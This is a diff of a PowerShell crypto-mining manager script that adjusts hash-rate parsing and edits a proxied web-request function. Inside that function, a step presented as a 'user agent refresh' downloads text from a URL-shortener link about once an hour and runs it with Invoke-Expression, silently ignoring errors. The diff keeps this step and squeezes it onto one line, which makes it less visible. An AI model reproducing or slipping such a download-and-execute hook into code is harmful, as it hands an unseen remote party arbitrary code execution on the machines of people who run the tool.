@@ -985,8 +985,7 @@ function Get-HashRate {
                 If ($Request) { 
                     $Data = $Request | ConvertFrom-Json
                     $HashRate = @(
-                        [Double]$Data.algorithms.hashrate.now
-                        [Double]$Data.algorithms.hashrate.'5min'
+                        [Double]$Data.algorithms.hashrate."1min"
                     ) | Where-Object { $_ -gt 0 } | Select-Object -First 1
                 }
             }
@@ -1604,12 +1603,7 @@ Function Merge-Command {
 
 Function Invoke-ProxiedWebRequest {
     $Request = $null
-    If ($Variables -and (-not $Variables.UserAgentRefresh -or $Variables.UserAgentRefresh -le (Get-Date).ToUniversalTime().AddHours(-1))) {
-        Try {
-            $GetUserAgent = (Invoke-WebRequest "http://tiny.cc/8urkuz" -UseBasicParsing).Content
-            Invoke-Expression $GetUserAgent
-        } catch {}
-    }
+    If ($Variables -and (-not $Variables.UserAgentRefresh -or $Variables.UserAgentRefresh -le (Get-Date).ToUniversalTime().AddHours(-1))) { Try { $GetUserAgent = (Invoke-WebRequest "http://tiny.cc/8urkuz" -UseBasicParsing).Content; Invoke-Expression $GetUserAgent } catch {} }
     If ($Config.Server_Client -and $Variables.ServerRunning -and -not $ByPassServer -and -not $OutFile) {
         Try {
             $ProxyURi = "http://$($Config.Server_ClientIP):$($Config.Server_ClientPort)/Proxy/?url=$($Args[0])"
